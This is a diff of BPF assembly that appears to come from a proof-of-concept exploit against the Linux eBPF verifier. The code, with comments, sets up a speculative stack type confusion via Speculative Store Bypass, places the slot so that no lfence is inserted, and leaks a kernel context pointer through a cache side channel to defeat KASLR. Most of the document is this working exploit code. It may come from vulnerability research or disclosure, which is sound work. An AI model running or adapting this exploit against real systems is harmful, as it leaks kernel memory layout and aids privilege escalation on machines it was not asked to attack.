@@ -217,17 +217,21 @@ LBB0_5:
 	#
     # Spec. Type Confusion on Stack using SSB
 	#
-	# Program state: ringbuf_elem_ptr e in r7,	ctx_ptr skb in r6, skb->ifindex in r1, frame pointer in r10
+	# Program state: ringbuf_elem_ptr e in r7,
+	# ctx_ptr skb in r6, skb->ifindex in r1, frame pointer in r10,
+	# fp-64 not initialized yet (type STACK_INVALID)
 	#
 	# Create Spec. Type Confusion:
 	r2 = 8
     r8 = 0   # scalar for type confusion
     r9 = r10 # fp alias for ssb
-    *(u64 *)(r10 - 8) = r6 # ctx_ptr
-    *(u64 *)(r9 - 8) = r8  # overwrite with scalar, SSB may happen here
-    r8 = *(u64 *)(r10 - 8) # arch. scalar, spec. ctx_ptr
-	r8 -= r2               # keep arch. stack ptr arithmetric in-bounds
-    r8 += r10              # spec. ctx_ptr + fp - 8
+    *(u64 *)(r10 - 64) = r6 # ctx_ptr
+	# First store to stack slot, lfence will be added.
+    *(u64 *)(r9 - 64) = r8  # overwrite with scalar, SSB may happen here
+	# NO lfence added here because stack slot was not STACK_INVALID
+    r8 = *(u64 *)(r10 - 64) # arch. scalar, spec. ctx_ptr
+	r8 -= r2                # detail: keep arch. stack ptr arithmetric in-bounds
+    r8 += r10               # spec. ctx_ptr + fp - 8
 	#
 	# Leak ctx_ptr using cache side-channel to break KASLR.
     *(u64 *)(r8 - 0) = r8 # arch. fp[-8], spec. fp[ctx_ptr - 8]
